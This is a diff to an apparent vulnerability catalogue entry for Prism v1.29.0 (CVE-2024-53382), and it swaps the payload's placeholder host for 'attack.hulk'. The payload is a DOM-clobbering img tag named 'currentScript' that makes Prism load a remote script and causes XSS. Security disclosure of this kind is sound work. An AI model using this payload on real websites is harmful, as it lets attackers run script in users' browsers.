@@ -6,9 +6,9 @@
 + Stars: 12.2K
 + Version: v1.29.0
 + Fingerprint: `typeof window.Prism !== 'undefined'`
-+ Payload: ```<img name="currentScript" src="https://xxx.xxx.xxx/a.js"></img>```
++ Payload: ```<img name="currentScript" src="https://attack.hulk/a.js"></img>```
 + Impact: XSS
-+ CVE: CVE-2024-53382
++ CVE: [CVE-2024-53382](https://nvd.nist.gov/vuln/detail/CVE-2024-53382)
 + Status: Reported
 + Foundby: TheHulk
 
